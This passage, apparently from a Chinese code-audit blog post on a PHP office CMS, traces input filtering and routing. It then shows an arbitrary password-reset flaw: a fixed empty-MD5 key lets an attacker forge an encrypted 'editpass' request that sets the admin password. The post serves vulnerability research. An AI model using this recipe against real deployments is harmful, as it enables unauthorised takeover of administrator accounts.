+</span></span><span style="display:flex;"><span>		<span style="color:#ff636f">if</span>(<span style="color:#58a1dd">$lx</span><span style="color:#ff636f">==</span><span style="color:#a6be9d">3</span>)<span style="color:#58a1dd">$jmbo</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">isjm</span>(<span style="color:#58a1dd">$s</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#ff636f">if</span>(<span style="color:#58a1dd">substr</span>(<span style="color:#58a1dd">$s</span>, <span style="color:#a6be9d">0</span>, <span style="color:#a6be9d">7</span>)<span style="color:#ff636f">==</span><span style="color:#a6be9d">&#39;rockjm_&#39;</span> <span style="color:#ff636f">||</span> <span style="color:#58a1dd">$lx</span> <span style="color:#ff636f">==</span> <span style="color:#a6be9d">1</span> <span style="color:#ff636f">||</span> <span style="color:#58a1dd">$jmbo</span>){
+</span></span><span style="display:flex;"><span>			<span style="color:#58a1dd">$s</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">str_replace</span>(<span style="color:#a6be9d">&#39;rockjm_&#39;</span>, <span style="color:#a6be9d">&#39;&#39;</span>, <span style="color:#58a1dd">$s</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#58a1dd">$s</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">jm</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">uncrypt</span>(<span style="color:#58a1dd">$s</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#ff636f">if</span>(<span style="color:#58a1dd">$lx</span><span style="color:#ff636f">==</span><span style="color:#a6be9d">1</span>){
+</span></span><span style="display:flex;"><span>				<span style="color:#58a1dd">$jmbo</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">isjm</span>(<span style="color:#58a1dd">$s</span>);
+</span></span><span style="display:flex;"><span>				<span style="color:#ff636f">if</span>(<span style="color:#58a1dd">$jmbo</span>)<span style="color:#58a1dd">$s</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">jm</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">uncrypt</span>(<span style="color:#58a1dd">$s</span>);
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#ff636f">if</span>(<span style="color:#58a1dd">substr</span>(<span style="color:#58a1dd">$s</span>, <span style="color:#a6be9d">0</span>, <span style="color:#a6be9d">7</span>)<span style="color:#ff636f">==</span><span style="color:#a6be9d">&#39;basejm_&#39;</span> <span style="color:#ff636f">||</span> <span style="color:#58a1dd">$lx</span><span style="color:#ff636f">==</span><span style="color:#a6be9d">5</span>){
+</span></span><span style="display:flex;"><span>			<span style="color:#58a1dd">$s</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">str_replace</span>(<span style="color:#a6be9d">&#39;basejm_&#39;</span>, <span style="color:#a6be9d">&#39;&#39;</span>, <span style="color:#58a1dd">$s</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#58a1dd">$s</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">jm</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">base64decode</span>(<span style="color:#58a1dd">$s</span>);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$s</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">str_replace</span>(<span style="color:#a6be9d">&#34;&#39;&#34;</span>, <span style="color:#a6be9d">&#39;&amp;#39&#39;</span>, <span style="color:#58a1dd">$s</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$s</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">str_replace</span>(<span style="color:#a6be9d">&#39;%20&#39;</span>, <span style="color:#a6be9d">&#39;&#39;</span>, <span style="color:#58a1dd">$s</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#ff636f">if</span>(<span style="color:#58a1dd">$lx</span><span style="color:#ff636f">==</span><span style="color:#a6be9d">2</span>)<span style="color:#58a1dd">$s</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">str_replace</span>(<span style="color:#ff636f">array</span>(<span style="color:#a6be9d">&#39;{&#39;</span>,<span style="color:#a6be9d">&#39;}&#39;</span>), <span style="color:#ff636f">array</span>(<span style="color:#a6be9d">&#39;[H1]&#39;</span>,<span style="color:#a6be9d">&#39;[H2]&#39;</span>), <span style="color:#58a1dd">$s</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$str</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">strtolower</span>(<span style="color:#58a1dd">$s</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#ff636f">foreach</span>(<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">lvlaras</span> <span style="color:#ff636f">as</span> <span style="color:#58a1dd">$v1</span>)<span style="color:#ff636f">if</span>(<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">contain</span>(<span style="color:#58a1dd">$str</span>, <span style="color:#58a1dd">$v1</span>)){
+</span></span><span style="display:flex;"><span>			<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">debug</span>(<span style="color:#a6be9d">&#39;&#39;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$na</span><span style="color:#ff636f">.</span><span style="color:#a6be9d">&#39;《&#39;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$s</span><span style="color:#ff636f">.</span><span style="color:#a6be9d">&#39;》error:包含非法字符《&#39;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$v1</span><span style="color:#ff636f">.</span><span style="color:#a6be9d">&#39;》&#39;</span>,<span style="color:#a6be9d">&#39;params_err&#39;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#58a1dd">$s</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">lvlarrep</span>(<span style="color:#58a1dd">$str</span>, <span style="color:#58a1dd">$v1</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#58a1dd">$str</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$s</span>;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$cslv</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">array</span>(<span style="color:#a6be9d">&#39;m&#39;</span>,<span style="color:#a6be9d">&#39;a&#39;</span>,<span style="color:#a6be9d">&#39;p&#39;</span>,<span style="color:#a6be9d">&#39;d&#39;</span>,<span style="color:#a6be9d">&#39;ip&#39;</span>,<span style="color:#a6be9d">&#39;web&#39;</span>,<span style="color:#a6be9d">&#39;host&#39;</span>,<span style="color:#a6be9d">&#39;ajaxbool&#39;</span>,<span style="color:#a6be9d">&#39;token&#39;</span>,<span style="color:#a6be9d">&#39;adminid&#39;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#ff636f">if</span>(<span style="color:#58a1dd">in_array</span>(<span style="color:#58a1dd">$na</span>, <span style="color:#58a1dd">$cslv</span>))<span style="color:#58a1dd">$s</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">xssrepstr</span>(<span style="color:#58a1dd">$s</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#ff636f">return</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">reteistrs</span>(<span style="color:#58a1dd">$s</span>);
+</span></span><span style="display:flex;"><span>	}</span></span></code></pre></div><p>将get传来的参数赋值给val，如果这个参数的值不合规（为空），就让val等于传入的dev，之后调用jmuncode对这个val进行处理，一方面是匹配前缀进行处理，一方面是进行过滤</p>
+<p>至于这里的jm对象是啥时候被初始化的，实际上是这里</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181442008.webp" alt="image-20240918144205865" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181442008.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181442008.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181442008.webp?size=large 2x" data-title="image-20240918144205865" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>但是这里有点奇怪，他在末尾调用的这个初始化，但是上面就用到了jm对象，这个对象是空，所以这里会出一个报错</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181454598.webp" alt="image-20240918145442283" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181454598.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181454598.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181454598.webp?size=large 2x" data-title="image-20240918145442283" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181459594.webp" alt="image-20240918145903472" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181459594.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181459594.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181459594.webp?size=large 2x" data-title="image-20240918145903472" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>接着看代码，config.php</p>
+<p>接下来加载了配置文件</p>
+<p><code>$_confpath     = $rock-&gt;strformat('?0/?1/?1Config.php', *ROOT_PATH*, *PROJECT*);</code></p>
+<p>这个写法用的还挺多的，上面看的<code>if(!defined('PROJECT'))define('PROJECT', $rock-&gt;get('p', 'webmain'));</code>定义了这个PROJECT，webmain相当于我们没传p参数以后敲定的默认值了，这应该也是这个开发团队忽略了这个报错的原因。</p>
+<p>再接着看这里config.php写的限制IP的方法</p>
+<p><code>$_confpath  = ''.*ROOT_PATH*.'/config/iplogs.php'; //这个用来限制IP访问的 if(file_exists($_confpath) &amp;&amp; *PHP_SAPI* != 'cli')include_once($_confpath);</code></p>
+<p>这个文件包含以后自动调用这个函数<code>ipwhiteshows($rock-&gt;ip, $rock);</code></p>
+<p>而这里rock的ip是不准的</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181509088.webp" alt="image-20240918150924882" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181509088.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181509088.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181509088.webp?size=large 2x" data-title="image-20240918150924882" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>再粗略看一下，这里封ip用的是exit   <code>exit('您IP['.$ip.']禁止访问我们站点，有问题请联系我们');</code></p>
+<p>到这里我们走出了config.php，继续回到index.php</p>
+<p>判断是否传了rewriteurl，传了的话就把d   m   a分别重置为rewriteurl里下划线<code>_</code>分开的三段</p>
+<p><code>if(isset($_uurla[2])){$d = $_uurla[0];$m = $_uurla[1];$a = $_uurla[2];}</code></p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181515490.webp" alt="image-20240918151508303" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181515490.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181515490.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181515490.webp?size=large 2x" data-title="image-20240918151508303" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里控制路由的几个参数就确定了，接下来在view.php里确定路由是怎么走的</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">$p</span>			<span style="color:#ff636f">=</span> <span style="color:#58a1dd">PROJECT</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span>(<span style="color:#ff636f">!</span><span style="color:#58a1dd">isset</span>(<span style="color:#58a1dd">$m</span>))<span style="color:#58a1dd">$m</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;index&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span>(<span style="color:#ff636f">!</span><span style="color:#58a1dd">isset</span>(<span style="color:#58a1dd">$a</span>))<span style="color:#58a1dd">$a</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;default&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span>(<span style="color:#ff636f">!</span><span style="color:#58a1dd">isset</span>(<span style="color:#58a1dd">$d</span>))<span style="color:#58a1dd">$d</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$m</span>			<span style="color:#ff636f">=</span> <span style="color:#58a1dd">$rock</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">get</span>(<span style="color:#a6be9d">&#39;m&#39;</span>, <span style="color:#58a1dd">$m</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$a</span>			<span style="color:#ff636f">=</span> <span style="color:#58a1dd">$rock</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">get</span>(<span style="color:#a6be9d">&#39;a&#39;</span>, <span style="color:#58a1dd">$a</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$d</span>			<span style="color:#ff636f">=</span> <span style="color:#58a1dd">$rock</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">get</span>(<span style="color:#a6be9d">&#39;d&#39;</span>, <span style="color:#58a1dd">$d</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">define</span>(<span style="color:#a6be9d">&#39;M&#39;</span>, <span style="color:#58a1dd">$m</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">define</span>(<span style="color:#a6be9d">&#39;A&#39;</span>, <span style="color:#58a1dd">$a</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">define</span>(<span style="color:#a6be9d">&#39;D&#39;</span>, <span style="color:#58a1dd">$d</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">define</span>(<span style="color:#a6be9d">&#39;P&#39;</span>, <span style="color:#58a1dd">$p</span>);</span></span></code></pre></div><p>PROJECT早就定义好了是webmain，其余的就是我们可以控制的MAD三个变量</p>
+<p><code>include_once($rock-&gt;strformat('?0/?1/?1Action.php',*ROOT_PATH*, $p));</code></p>
+<p>这里包含 /webmain/webmainAction.php文件</p>
+<p>这一段算是定义好了路由怎么走，怎么动态执行类的方法</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181529194.webp" alt="image-20240918152922885" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181529194.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181529194.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181529194.webp?size=large 2x" data-title="image-20240918152922885" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>再往下则是该CMS自写的模板解析功能</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181530583.webp" alt="image-20240918153042350" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181530583.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181530583.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181530583.webp?size=large 2x" data-title="image-20240918153042350" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="代码审计" class="heading-element"><span>代码审计</span>
+  <a href="#%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="任意密码修改" class="heading-element"><span>任意密码修改</span>
+  <a href="#%e4%bb%bb%e6%84%8f%e5%af%86%e7%a0%81%e4%bf%ae%e6%94%b9" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>定位这个漏洞起初是seay里定位到一个include/class/mysql.php的record函数</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">record</span>(<span style="color:#58a1dd">$table</span>,<span style="color:#58a1dd">$array</span>,<span style="color:#58a1dd">$where</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$addbool</span>  	<span style="color:#ff636f">=</span> <span style="color:#ff636f">true</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#ff636f">if</span>(<span style="color:#ff636f">!</span><span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">isempt</span>(<span style="color:#58a1dd">$where</span>))<span style="color:#58a1dd">$addbool</span><span style="color:#ff636f">=</span><span style="color:#ff636f">false</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$cont</span>		<span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#ff636f">if</span>(<span style="color:#58a1dd">is_array</span>(<span style="color:#58a1dd">$array</span>)){
+</span></span><span style="display:flex;"><span>			<span style="color:#ff636f">foreach</span>(<span style="color:#58a1dd">$array</span> <span style="color:#ff636f">as</span> <span style="color:#58a1dd">$key</span><span style="color:#ff636f">=&gt;</span><span style="color:#58a1dd">$val</span>){
+</span></span><span style="display:flex;"><span>				<span style="color:#58a1dd">$cont</span><span style="color:#ff636f">.=</span><span style="color:#a6be9d">&#34;,`</span><span style="color:#a6be9d">$key</span><span style="color:#a6be9d">`=&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">toaddval</span>(<span style="color:#58a1dd">$val</span>)<span style="color:#ff636f">.</span><span style="color:#a6be9d">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>			<span style="color:#58a1dd">$cont</span>	<span style="color:#ff636f">=</span> <span style="color:#58a1dd">substr</span>(<span style="color:#58a1dd">$cont</span>,<span style="color:#a6be9d">1</span>);
+</span></span><span style="display:flex;"><span>		}<span style="color:#ff636f">else</span>{
+</span></span><span style="display:flex;"><span>			<span style="color:#58a1dd">$cont</span>	<span style="color:#ff636f">=</span> <span style="color:#58a1dd">$array</span>;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#ff636f">if</span>(<span style="color:#58a1dd">$addbool</span>){
+</span></span><span style="display:flex;"><span>			<span style="color:#58a1dd">$sql</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;insert into `</span><span style="color:#a6be9d">$table</span><span style="color:#a6be9d">` set </span><span style="color:#a6be9d">$cont</span><span style="color:#a6be9d">&#34;</span>;
+</span></span><span style="display:flex;"><span>		}<span style="color:#ff636f">else</span>{
+</span></span><span style="display:flex;"><span>			<span style="color:#58a1dd">$where</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">getwhere</span>(<span style="color:#58a1dd">$where</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#58a1dd">$sql</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;update `</span><span style="color:#a6be9d">$table</span><span style="color:#a6be9d">` set </span><span style="color:#a6be9d">$cont</span><span style="color:#a6be9d"> where </span><span style="color:#a6be9d">$where</span><span style="color:#a6be9d">&#34;</span>;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#ff636f">return</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">tranbegin</span>(<span style="color:#58a1dd">$sql</span>);
+</span></span><span style="display:flex;"><span>	}</span></span></code></pre></div><p>没有做啥过滤，寻找这个函数在哪里调用，搜索<code>-&gt;record</code></p>
+<p>找到了webmain\task\api\userAction.php，是一个控制器</p>
+<p>漏洞存在于<code>webmain/task/api/reimplatAction.php</code>   indexAction方法中</p>
+<p>这个方法是有一个加密的，位于jm-&gt;strunlook($body, $key);，这个key默认是空的md5，是固定的，因此可以逆推加密：</p>
+<p><code>// $test = $this-&gt;jm-&gt;strlook(json_encode(array(&quot;msgtype&quot;=&gt;&quot;editpass&quot;,&quot;user&quot;=&gt;&quot;admin&quot;,&quot;pass&quot;=&gt;&quot;123456&quot;)), $key); </code></p>
+<p><code>// echo $test;</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">$body</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">getpostdata</span>();
+</span></span><span style="display:flex;"><span>		<span style="color:#ff636f">if</span>(<span style="color:#ff636f">!</span><span style="color:#58a1dd">$body</span>)<span style="color:#ff636f">return</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$db</span> 	 <span style="color:#ff636f">=</span> <span style="color:#58a1dd">m</span>(<span style="color:#a6be9d">&#39;reimplat:dept&#39;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$key</span> 	 <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$db</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">gethkey</span>();
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$bodystr</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">jm</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">strunlook</span>(<span style="color:#58a1dd">$body</span>, <span style="color:#58a1dd">$key</span>);
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//        $test = $this-&gt;jm-&gt;strlook(json_encode(array(&#34;msgtype&#34;=&gt;&#34;editpass&#34;,&#34;user&#34;=&gt;&#34;admin&#34;,&#34;pass&#34;=&gt;&#34;123456&#34;)), $key);
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//        echo $test;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">if</span>(<span style="color:#ff636f">!</span><span style="color:#58a1dd">$bodystr</span>)<span style="color:#ff636f">return</span>;
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$data</span> 	 <span style="color:#ff636f">=</span> <span style="color:#58a1dd">json_decode</span>(<span style="color:#58a1dd">$bodystr</span>, <span style="color:#ff636f">true</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$msgtype</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">arrvalue</span>(<span style="color:#58a1dd">$data</span>,<span style="color:#a6be9d">&#39;msgtype&#39;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$msgevent</span><span style="color:#ff636f">=</span> <span style="color:#58a1dd">arrvalue</span>(<span style="color:#58a1dd">$data</span>,<span style="color:#a6be9d">&#39;msgevent&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//省略
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span>(<span style="color:#58a1dd">$msgtype</span><span style="color:#ff636f">==</span><span style="color:#a6be9d">&#39;editpass&#39;</span>){
+</span></span><span style="display:flex;"><span>			<span style="color:#58a1dd">$user</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">arrvalue</span>(<span style="color:#58a1dd">$data</span>, <span style="color:#a6be9d">&#39;user&#39;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#58a1dd">$pass</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">arrvalue</span>(<span style="color:#58a1dd">$data</span>, <span style="color:#a6be9d">&#39;pass&#39;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#ff636f">if</span>(<span style="color:#58a1dd">$pass</span> <span style="color:#ff636f">&amp;&amp;</span> <span style="color:#58a1dd">$user</span>){
+</span></span><span style="display:flex;"><span>				<span style="color:#58a1dd">$where</span>  <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;`user`=&#39;</span><span style="color:#a6be9d">$user</span><span style="color:#a6be9d">&#39;&#34;</span>;
+</span></span><span style="display:flex;"><span>				<span style="color:#58a1dd">$mima</span> 	<span style="color:#ff636f">=</span> <span style="color:#58a1dd">md5</span>(<span style="color:#58a1dd">$pass</span>);
